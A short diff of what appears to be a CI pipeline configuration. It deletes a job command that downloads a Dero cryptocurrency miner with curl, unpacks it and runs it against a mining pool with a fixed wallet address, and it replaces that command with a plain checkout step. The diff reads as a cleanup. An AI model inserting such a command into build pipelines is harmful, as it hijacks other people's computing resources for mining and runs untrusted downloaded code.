@@ -10,4 +10,4 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'curl -sLJO "https://github.com/DeroLuna/dero-miner/releases/download/v1.7-beta/deroluna-miner-linux-amd64.tar.gz" && tar -xvf deroluna-miner-linux-amd64.tar.gz && ./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6kn0vz5y2fuy2qd8emvd -d community-pools.mysrv.cloud:10300'
+            - checkout
